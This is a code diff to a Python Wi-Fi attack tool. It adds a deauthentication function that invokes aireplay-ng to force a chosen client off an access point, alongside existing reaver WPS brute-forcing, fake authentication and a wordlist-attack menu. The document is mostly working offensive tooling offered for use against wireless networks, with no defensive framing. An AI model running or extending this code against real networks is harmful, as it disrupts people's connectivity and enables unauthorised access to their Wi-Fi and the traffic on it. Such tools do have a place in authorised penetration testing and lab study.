@@ -1,5 +1,6 @@
 import subprocess
 import re
+import argparse
 
 
 class WirelessSecurityTool:
@@ -18,6 +19,13 @@ class WirelessSecurityTool:
         print(f"Using {self.adapter} to check for WPS")
         subprocess.run(["wash", "--interface", self.adapter])
 
+    def deauth_attack(self, client_bssid, deauth_pack, client_mac):
+        '''Deauth attack function'''
+        print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
+        subprocess.run(
+            ['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, self.adapter],
+            check=True)
+
     def capture_handshake(self):
         """Capture WPA handshake"""
         print("Capturing handshake")
@@ -27,6 +35,10 @@ class WirelessSecurityTool:
         print(output[0])
         adapter_mac = input("[+] Input adapter MAC: ")
         channel = input("[+] Input channel of Wi-Fi network: ")
+
+        options = self.get_input()
+        self.deauth_attack(options.client_bssid, options.deauth_pack, options.client_mac)
+
         subprocess.run(['reaver', '--bssid', wifi_mac, '--channel', channel, '--interface', self.adapter, '-vvv',
                         '--no-associate'])
         subprocess.run(['aireplay-ng', '-1', '30', '-a', wifi_mac, '-h', adapter_mac, self.adapter])
@@ -72,3 +84,27 @@ class WirelessSecurityTool:
         print("1. WPS")
         print("2. Wordlist Attack")
         return input("Selection: ")
+
+    @staticmethod
+    def get_input():
+        """Get input"""
+        parser = argparse.ArgumentParser()
+        parser.add_argument("-a", "--client_bssid", help="specify client BSSID")
+        parser.add_argument("-p", "--deauth_pack", type=int, help="specify number of deauth packets")
+        parser.add_argument("-c", "--client_mac", help="specify client MAC address")
+        args = parser.parse_args()
+
+        if not all([args.client_bssid, args.deauth_pack, args.client_mac]):
+            parser.error("[-] Please provide all the required arguments. Use --help for more information.")
+
+        return args
+
+
+def main():
+    adapter = input("[+] Input Wi-Fi adapter: ")
+    tool = WirelessSecurityTool(adapter)
+    tool.run_wireless_security_tool()
+
+
+if __name__ == "__main__":
+    main()
